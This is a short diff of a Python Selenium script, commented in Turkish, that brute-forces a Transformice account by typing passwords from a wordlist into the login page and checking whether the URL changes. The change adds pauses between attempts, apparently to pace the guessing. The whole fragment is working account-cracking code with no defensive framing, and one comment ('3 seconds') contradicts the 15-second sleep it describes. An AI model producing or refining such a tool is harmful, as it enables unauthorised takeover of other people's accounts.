@@ -24,8 +24,11 @@ dosya = open("sifre.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı 
 
 for satir in dosya:
     username.send_keys(name) # Transformice kullanıcı adı knk.
+    time.sleep(1)
     password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
+    time.sleep(1)
     giris.click() # Giriş yap butonuna tıklama komutu knk.
+    time.sleep(1)
     time.sleep(15) # Şifreler denendikten sonra 3 saniye bekle.
     if driver.current_url == correctUrl:
         time.sleep(16)
